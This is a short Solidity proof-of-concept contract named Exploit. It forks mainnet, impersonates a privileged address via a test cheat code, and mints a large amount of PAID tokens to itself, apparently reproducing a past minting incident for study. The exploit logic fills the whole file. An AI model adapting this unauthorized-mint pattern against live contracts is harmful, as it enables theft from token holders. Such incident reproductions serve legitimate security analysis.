// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPaid {
    function mint(address _owner, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function prank(address) external;
}

contract Exploit {
    function run() external returns (uint256) {
        IPaid paid = IPaid(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df);
        CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        cheats.createSelectFork("mainnet", 11979839);
        uint256 balanceBefore = paid.balanceOf(address(this));
        cheats.prank(0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE);
        paid.mint(address(this), 59471745571000000000000000);
        uint256 balanceAfter = paid.balanceOf(address(this));
        return balanceAfter - balanceBefore;
    }

    receive() external payable {}
}
